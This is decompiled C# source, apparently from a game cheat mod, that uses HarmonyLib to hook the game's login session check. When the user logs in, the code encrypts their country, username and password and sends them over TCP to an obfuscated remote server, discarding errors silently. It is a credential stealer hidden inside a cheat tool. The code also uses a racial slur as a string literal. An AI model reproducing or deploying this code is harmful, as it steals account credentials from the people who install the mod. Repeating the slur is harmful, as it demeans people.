using System;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading.Tasks;
using HarmonyLib;
using Il2CppNebula.Core.Models;
using MKS;
using MKS_Cheat_BSP;

// Token: 0x02000009 RID: 9
[global::System.Runtime.CompilerServices.Nullable(0)]
[global::System.Runtime.CompilerServices.NullableContext(1)]
[global::HarmonyLib.HarmonyPatch(typeof(global::Il2CppNebula.Core.Models.UserSession), "IsLoggedIn")]
internal class Hh
{
	// Token: 0x0600000D RID: 13 RVA: 0x00002760 File Offset: 0x00000960
	[global::HarmonyLib.HarmonyPostfix]
	public static void Postfix(ref global::Il2CppNebula.Core.Models.UserSession __instance)
	{
		if (global::MKS.Xd.check("nigger") == global::EeE.smethod_20(0))
		{
			global::Hh.BSPUserValidate(__instance.Profile.Country, __instance.Profile.Name, __instance.Login.Password);
		}
	}

	// Token: 0x0600000E RID: 14 RVA: 0x000027B0 File Offset: 0x000009B0
	private static async void BSPUserValidate(string count, string name, string pass)
	{
		global::System.Runtime.CompilerServices.TaskAwaiter taskAwaiter = global::System.Threading.Tasks.Task.Run(delegate
		{
			try
			{
				global::System.Net.Sockets.TcpClient tcpClient = new global::System.Net.Sockets.TcpClient(global::MKS.Xd.iKl, global::MKS.Xd.TB5);
				global::System.Net.Sockets.NetworkStream stream = tcpClient.GetStream();
				byte[] bytes = global::System.Text.Encoding.UTF8.GetBytes("ip");
				stream.Write(bytes, 0, bytes.Length);
				byte[] array = new byte[1024];
				int num = stream.Read(array, 0, array.Length);
				string[] array2 = global::System.Text.Encoding.UTF8.GetString(array, 0, num).Split('|', global::System.StringSplitOptions.None);
				string text = array2[0];
				string text2 = array2[1];
				tcpClient.Close();
				tcpClient.Dispose();
				global::System.Runtime.CompilerServices.DefaultInterpolatedStringHandler defaultInterpolatedStringHandler = new global::System.Runtime.CompilerServices.DefaultInterpolatedStringHandler(2, 3);
				defaultInterpolatedStringHandler.AppendFormatted(global::MKS_Cheat_BSP.MN.EncryptText(count, global::MKS.Xd.kBI + text + global::MKS.Xd.pBe));
				defaultInterpolatedStringHandler.AppendLiteral("Œ");
				defaultInterpolatedStringHandler.AppendFormatted(global::MKS_Cheat_BSP.MN.EncryptText(name, global::MKS.Xd.kBI + text + global::MKS.Xd.pBe));
				defaultInterpolatedStringHandler.AppendLiteral("Œ");
				defaultInterpolatedStringHandler.AppendFormatted(global::MKS_Cheat_BSP.MN.EncryptText(pass, global::MKS.Xd.kBI + text + global::MKS.Xd.pBe));
				string text3 = defaultInterpolatedStringHandler.ToStringAndClear();
				global::System.Net.Sockets.TcpClient tcpClient2 = new global::System.Net.Sockets.TcpClient(global::MKS.Xd.iKl, global::MKS.Xd.TB5);
				global::System.Net.Sockets.NetworkStream stream2 = tcpClient2.GetStream();
				global::System.Text.Encoding utf = global::System.Text.Encoding.UTF8;
				defaultInterpolatedStringHandler = new global::System.Runtime.CompilerServices.DefaultInterpolatedStringHandler(7, 3);
				defaultInterpolatedStringHandler.AppendFormatted(global::MKS.Xd.TBW);
				defaultInterpolatedStringHandler.AppendLiteral(":");
				defaultInterpolatedStringHandler.AppendFormatted(global::MKS_Cheat_BSP.MN.EncryptText(global::MKS.Xd.KKy, global::MKS.Xd.kBI + text + global::MKS.Xd.pBe));
				defaultInterpolatedStringHandler.AppendLiteral(":Œ");
				defaultInterpolatedStringHandler.AppendFormatted(text3);
				defaultInterpolatedStringHandler.AppendLiteral("Œbac");
				byte[] bytes2 = utf.GetBytes(defaultInterpolatedStringHandler.ToStringAndClear());
				stream2.Write(bytes2, 0, bytes2.Length);
				byte[] array3 = new byte[1024];
				int num2 = stream2.Read(array3, 0, array3.Length);
				global::System.Text.Encoding.UTF8.GetString(array3, 0, num2);
				tcpClient2.Close();
				tcpClient2.Dispose();
			}
			catch (global::System.Exception)
			{
			}
		}).GetAwaiter();
		if (!taskAwaiter.IsCompleted)
		{
			await taskAwaiter;
			global::System.Runtime.CompilerServices.TaskAwaiter taskAwaiter2;
			taskAwaiter = taskAwaiter2;
			taskAwaiter2 = default(global::System.Runtime.CompilerServices.TaskAwaiter);
		}
		taskAwaiter.GetResult();
	}
}
